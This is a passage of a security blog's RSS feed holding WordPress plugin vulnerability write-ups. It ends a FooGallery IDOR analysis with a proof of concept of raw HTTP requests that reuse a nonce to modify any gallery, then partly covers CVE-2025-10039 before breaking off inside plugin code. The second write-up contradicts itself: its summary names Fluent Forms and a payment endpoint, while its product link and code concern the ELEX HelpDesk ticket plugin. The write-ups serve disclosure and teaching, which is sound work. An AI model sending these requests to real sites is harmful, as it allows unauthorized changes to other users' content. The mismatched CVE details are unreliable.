nonce is embedded into the HTML of the &lt;strong&gt;edit gallery&lt;/strong&gt; page.&lt;/p&gt;&#xA;&lt;p&gt;Use the &lt;strong&gt;edit gallery&lt;/strong&gt; functionality → intercept the request in BurpSuite → filter requests with the keyword &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; title=&#34;Nonce value during filtering&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/data_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Data nonce&lt;/h2&gt;&lt;p&gt;Nonce value during filtering&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/data_nonce.png&#39; alt=&#34;Data nonce&#34; height=&#34;532&#34; width=&#34;956&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value during filtering&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We can extract the nonce value from this request.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce: foogallery_attachment_modal_open&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Return HTML modal &amp;#43; embedded nonce (foogallery-modal-nonce)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;User extracts nonce from response&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Send request: action=foogallery_attachment_modal_save&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Verify nonce: foogallery-modal-nonce&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Extract img_id from request&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;No capability / ownership check (edit_post)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;do_action(foogallery_attachment_save_data, img_id, data)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Update post / attachment data&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Unauthorized modification of arbitrary gallery/post (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Perform an edit gallery action with a user that has the &lt;code&gt;Gallery Creator&lt;/code&gt; role&lt;/li&gt;&#xA;&lt;li&gt;Search for the keyword &lt;code&gt;foogallery-image-edit-modal&lt;/code&gt; and extract the nonce from the response&lt;/li&gt;&#xA;&lt;li&gt;Send a request to retrieve the nonce for the &lt;code&gt;foogallery_attachment_modal_save_form&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_open&amp;amp;nonce=9ad3ed3e9b&amp;amp;img_id=1&amp;amp;gallery_id=1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; title=&#34;Get nonce from response&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;Get nonce from response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;656&#34; width=&#34;954&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Get nonce from response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Send a request to modify data of any gallery&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: valid_cookie&#xA;&#xA;action=foogallery_attachment_modal_save&amp;amp;nonce=11bfc5f814&amp;amp;foogallery[]=any_data&amp;amp;img_id=1&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;Use UI to perform:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy cập &lt;code&gt;http://localhost/wp-admin/post.php?post=post_id&amp;amp;action=edit#&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Edit and save&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#34; title=&#34;Edit and save&#34; data-thumbnail=&#34;/posts/2025-12-30-cve-2024-12114/edit.png&#34; data-sub-html=&#34;&lt;h2&gt;Edit&lt;/h2&gt;&lt;p&gt;Edit and save&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-30-cve-2024-12114/edit.png&#39; alt=&#34;Edit&#34; height=&#34;1002&#34; width=&#34;1879&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Edit and save&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability occurs due to &lt;strong&gt;missing authorization checks&lt;/strong&gt; on &lt;code&gt;img_id&lt;/code&gt;.&#xA;Although a nonce check exists, the plugin still allows authenticated users to modify &lt;strong&gt;galleries they do not own&lt;/strong&gt;, resulting in an &lt;strong&gt;IDOR&lt;/strong&gt; vulnerability.&#xA;Version 2.4.30 fixes this by checking &lt;code&gt;current_user_can( &#39;edit_post&#39;, $img_id )&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces &lt;strong&gt;do not replace&lt;/strong&gt; authorization controls&lt;/li&gt;&#xA;&lt;li&gt;Always check permissions at the &lt;strong&gt;object level&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Never trust client-side data, even with a nonce&lt;/li&gt;&#xA;&lt;li&gt;IDOR often appears in AJAX handlers missing &lt;code&gt;current_user_can()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/foogallery/vulnerability/wordpress-foogallery-plugin-2-4-29-insecure-direct-object-reference-to-authenticated-custom-arbitrary-post-page-updates-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FooGallery Plugin &amp;lt;= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10039 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-28-cve-2025-10039/</link>
      <pubDate>Sun, 28 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-28-cve-2025-10039/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions &lt;strong&gt;≤ 3.2.9&lt;/strong&gt; via the &lt;code&gt;submission_id&lt;/code&gt; parameter in the SCA payment confirmation endpoint.&#xA;The vulnerability allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to &lt;strong&gt;mark other users’ submissions as failed&lt;/strong&gt;, disrupting the payment process.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10039&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10039&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/elex-helpdesk-customer-support-ticket-system/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.2.9&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.3.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for authenticated users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_eh_crm_ticket_single_view_client&amp;#39;, array( &amp;#39;CRM_Ajax&amp;#39;, &amp;#39;eh_crm_ticket_single_view_client&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; is a hook for authenticated users (Subscriber+). When a request is sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=eh_crm_ticket_single_view_client&lt;/code&gt;, the callback &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client() {&#xA;    if ( wp_verify_nonce( isset( $_POST[&amp;#39;nonce&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;nonce&amp;#39;] ) : &amp;#39;&amp;#39;, &amp;#39;wsdesk_nonce&amp;#39; ) ) {&#xA;        $ticket_id = isset( $_POST[&amp;#39;ticket_id&amp;#39;] ) ? sanitize_text_field( $_POST[&amp;#39;ticket_id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;        $content   = self::eh_crm_ticket_single_view_client_gen( $ticket_id );&#xA;        wp_send_json_success( array( &amp;#39;page&amp;#39; =&amp;gt; $content ) );&#xA;        die;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function verifies the &lt;code&gt;nonce&lt;/code&gt; to mitigate CSRF attacks.&lt;/p&gt;&#xA;&lt;p&gt;It then extracts &lt;code&gt;ticket_id&lt;/code&gt; from the request and calls &lt;code&gt;eh_crm_ticket_single_view_client_gen()&lt;/code&gt; to retrieve the ticket content.&lt;/p&gt;&#xA;&lt;p&gt;Finally, the response is returned as JSON.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) {&#xA;&#xA;    // Fetch ticket data based on user-supplied ticket_id&#xA;    $current      = eh_crm_get_ticket( array( &amp;#39;ticket_id&amp;#39; =&amp;gt; $ticket_id ) );&#xA;    $current_meta = eh_crm_get_ticketmeta( $ticket_id );&#xA;&#xA;    // Fetch internal users (agent/admin)&#xA;    $users_data = get_users( array(&#xA;        &amp;#39;role__in&amp;#39; =&amp;gt; array( &amp;#39;administrator&amp;#39;, &amp;#39;WSDesk_Agents&amp;#39;, &amp;#39;WSDesk_Supervisor&amp;#39; )&#xA;    ));&#xA;&#xA;    ...&#xA;&#xA;    // Render ticket content (HTML output)&#xA;    echo esc_html( $current[0][&amp;#39;ticket_title&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_email&amp;#39;] );&#xA;    echo esc_html( $current[0][&amp;#39;ticket_date&amp;#39;] );&#xA;&#xA;    ...&#xA;&#xA;    // Render conversation, attachments, metadata&#xA;    self::eh_crm_ticket_reply_section_gen_client( $ticket_id );&#xA;&#xA;    ...&#xA;&#xA;    return ob_get_clean();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The functions &lt;code&gt;eh_crm_ticket_single_view_client_gen&lt;/code&gt; and &lt;code&gt;eh_crm_get_ticketmeta&lt;/code&gt; are used to retrieve ticket data:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticket( $args, $fields = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;$query = wpFluent()-&amp;gt;table( tables: &amp;#39;wsdesk_tickets&amp;#39; )-&amp;gt;where( &amp;#39;ticket_trash&amp;#39;, 0 );&#xA;&#xA;&#x9;if ( null !== $fields ) {&#xA;&#x9;&#x9;$fields = is_array( $fields ) ? $fields : array( $fields );&#xA;&#x9;&#x9;foreach ( $fields as $field ) {&#xA;&#x9;&#x9;&#x9;$query-&amp;gt;select( $field );&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;if ( is_array( $args ) ) {&#xA;&#x9;&#x9;foreach ( $args as $key =&amp;gt; $value ) {&#xA;&#x9;&#x9;&#x9;$allowed_fileds = array( &amp;#39;ticket_id&amp;#39;, &amp;#39;ticket_author&amp;#39;, &amp;#39;ticket_email&amp;#39;, &amp;#39;ticket_date&amp;#39;, &amp;#39;ticket_title&amp;#39;, &amp;#39;ticket_parent&amp;#39;, &amp;#39;ticket_category&amp;#39;, &amp;#39;ticket_vendor&amp;#39;, &amp;#39;ticket_trash&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( in_array( $key, $allowed_fileds, true ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$query-&amp;gt;where( $key, $value );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;$ticket = (array) $query-&amp;gt;first();&#xA;&#xA;&#x9;if ( ! $ticket ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#xA;&#x9;if ( isset( $ticket[&amp;#39;ticket_content&amp;#39;] ) ) {&#xA;&#x9;&#x9;$ticket[&amp;#39;ticket_content&amp;#39;] = wp_kses_post( $ticket[&amp;#39;ticket_content&amp;#39;] );&#xA;&#x9;}&#xA;&#xA;&#x9;return array( $ticket );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function eh_crm_get_ticketmeta( $id, $key = null ) {&#xA;&#x9;set_time_limit( 300 );&#xA;&#x9;global $wpdb;&#xA;&#x9;$data     = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d&amp;#39;, (int) $id ), ARRAY_A );&#xA;&#x9;$retrived = array();&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;$data = $wpdb-&amp;gt;get_results( $wpdb-&amp;gt;prepare( &amp;#39;SELECT meta_key,meta_value FROM &amp;#39; . $wpdb-&amp;gt;prefix . &amp;#39;wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s&amp;#39;, (int) $id, $key ), ARRAY_A );&#xA;&#x9;}&#xA;&#x9;if ( ! $data ) {&#xA;&#x9;&#x9;return false;&#xA;&#x9;}&#xA;&#x9;if ( null !== $key ) {&#xA;&#x9;&#x9;return maybe_unserialize( $data[0][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;for ( $i = 0; $i &amp;lt; count( $data ); $i&amp;#43;&amp;#43; ) 